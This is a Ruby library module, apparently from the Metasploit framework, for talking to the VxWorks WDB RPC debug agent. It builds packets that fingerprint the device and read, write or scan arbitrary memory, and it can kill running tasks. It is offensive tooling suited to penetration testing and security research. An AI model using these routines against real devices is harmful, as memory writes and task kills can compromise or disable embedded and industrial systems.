# -*- coding: binary -*-
require 'msf/core'

module Msf

###
#
# This module exposes methods for manipulating the WDRPC service
#
###
module Exploit::Remote::WDBRPC

  # WDB_TARGET_CONNECT2
  def wdbrpc_request_connect2(ip)
    ip += "\x00"
    while(ip.length % 4 != 0)
      ip << "\x00"
    end

    data = 	[
      0x00000002,
      0x00000000,
      0x00000000,
      0x00000001,
      ip.length
    ].pack("N*") + ip

    wdbrpc_request(0x7a, data)
  end

  # WDB_TARGET_CONNECT
  def wdbrpc_request_connect(ip)
    data = [ 0x00000002, 0x00000000, 0x00000000 ].pack("N*")
    wdbrpc_request(1, data)
  end

  # WDB_TARGET_DISCONNECT
  def wdbrpc_request_disconnect
    data = [ 0x00000002, 0x00000000, 0x00000000 ].pack("N*")
    wdbrpc_request(2, data)
  end

  def wdbrpc_request_regread(regset=0, offset=0, length=512, params=0)
    data = [ regset ].pack("N")

    # WDB_CTX
    data << [
      0, # WDB_CTX_SYSTEM (3 for task)
      0, # SYSTEM (or set for task)
    ].pack("N*")

    # WDB_MEM_REGION
    data << [
      offset, # baseAddress
      length, # numberOfBytes
      params, # params
    ].pack("N*")

    wdbrpc_request(40, data)
  end


  def wdbrpc_request_memread(offset=0, length=512, params=0)

    # WDB_MEM_REGION
    data = [
      offset, # baseAddress
      length, # numberOfBytes
      params, # params
    ].pack("N*")

    wdbrpc_request(10, data)
  end

  def wdbrpc_request_memwrite(offset=0, buff='', params=0)

    # Make sure its DWORD aligned
    while(buff.length % 4 != 0)
      buff << "\x00"
    end

    # WDB_MEM_XFER
    data = [
      buff.length,
      offset,      # target
      buff.length
    ].pack("N*") + buff

    wdbrpc_request(11, data)
  end


  def wdbrpc_request_memscan(offset=0, depth=1024, buff='', params=0)
    # Make sure its DWORD aligned
    while(buff.length % 4 != 0)
      buff << "\x00"
    end

    # WDB_MEM_REGION
    data = [
      offset, # baseAddress
      depth,  # numberOfBytes
      params, # params
    ].pack("N*")

    # WDB_MEM_XFER
    data << [
      buff.length,
      0,
      buff.length
    ].pack("N*") + buff

    wdbrpc_request(11, data)
  end

  def wdbrpc_request_context_kill(ctx_type, ctx)

    # WDB_CTX
    data = [
      ctx_type, # WDB_CTX_SYSTEM (3 for task)
      ctx,      # SYSTEM (or set for task)
    ].pack("N*")

    # options
    data << [ 0 ] .pack("N")

    wdbrpc_request(31, data)
  end

  def wdbrpc_parse_connect_reply(buff)
    info = {}
    head = buff.slice!(0,36)
    info[:agent_ver] = wdbrpc_decode_str(buff)
    info[:agent_mtu] = wdbrpc_decode_int(buff)
    info[:agent_mod] = wdbrpc_decode_int(buff)
    info[:rt_type]          = wdbrpc_decode_int(buff)
    info[:rt_vers]          = wdbrpc_decode_str(buff)
    info[:rt_cpu_type]      = wdbrpc_decode_int(buff)
    info[:rt_has_fpp]       = wdbrpc_decode_bool(buff)
    info[:rt_has_wp]        = wdbrpc_decode_bool(buff)
    info[:rt_page_size]     = wdbrpc_decode_int(buff)
    info[:rt_endian]        = wdbrpc_decode_int(buff)
    info[:rt_bsp_name]      = wdbrpc_decode_str(buff)
    info[:rt_bootline]      = wdbrpc_decode_str(buff)
    info[:rt_membase]       = wdbrpc_decode_int(buff)
    info[:rt_memsize]       = wdbrpc_decode_int(buff)
    info[:rt_region_count]  = wdbrpc_decode_int(buff)
    info[:rt_regions]       = wdbrpc_decode_arr(buff, :int)
    info[:rt_hostpool_base] = wdbrpc_decode_int(buff)
    info[:rt_hostpool_size] = wdbrpc_decode_int(buff)
    info
  end

  def wdbrpc_request(procedure, data)
    pkt =
      [
        0x00000000, # XID (ignored by checksum and length)
        0x00000000,
        0x00000002,
        0x55555555, # Program
        0x00000001, # Version
        procedure,  # Procedure
        0x00000000,
        0x00000000,
        0x00000000,
        0x00000000
      ].pack("N*")

    pkt +=
      [
        0x00000000, # Checksum
        0x00000000, # Packet Size
        wdbrpc_request_seqno
      ].pack("N*")

    pkt += data

    # Length excludes the XID
    pkt[44, 4] = [ pkt.length - 4].pack("N")

    # Set the checksum flag and calculate the checksum
    pkt[42, 2] = [ wdbrpc_checksum(pkt) ].pack("n")
    pkt[40, 2] = [0xffff].pack("n")

    # Set the RPC XID
    pkt[ 0, 4] = [ rand(0x100000000) ].pack("N")

    pkt
  end

  def wdbrpc_request_seqno
    @wdbrpc_seqno ||= 0
    @wdbrpc_seqno += 1
  end

  def wdbrpc_checksum(data)
    sum = 0
    data.unpack("n*").each {|c| sum += c }
    sum = (sum & 0xffff) + (sum >> 16)
    (~sum)
  end

  def wdbrpc_decode_str(data)
    return if data.length < 4
    slen = data.slice!(0,4).unpack("N")[0]
    return "" if slen == 0
    while (slen % 4 != 0)
      slen += 1
    end

    data.slice!(0,slen).to_s.split("\x00")[0]
  end

  def wdbrpc_decode_int(data)
    return if data.length < 4
    data.slice!(0,4).unpack("N")[0]
  end

  def wdbrpc_decode_arr(data, dtype)
    return if data.length < 4
    res = []

    alen = data.slice!(0,4).unpack("N")[0]
    return res if alen == 0

    1.upto(alen) do |idx|
      case dtype
      when :int
        res << wdbrpc_decode_int(data)
      when :str
        res << wdbrpc_decode_str(data)
      when :bool
        res << wdbrpc_decode_bool(data)
      end
    end

    res
  end

  def wdbrpc_decode_bool(data)
    return if data.length < 4
    (data.slice!(0,4).unpack("N")[0] == 0) ? false : true
  end

end
end

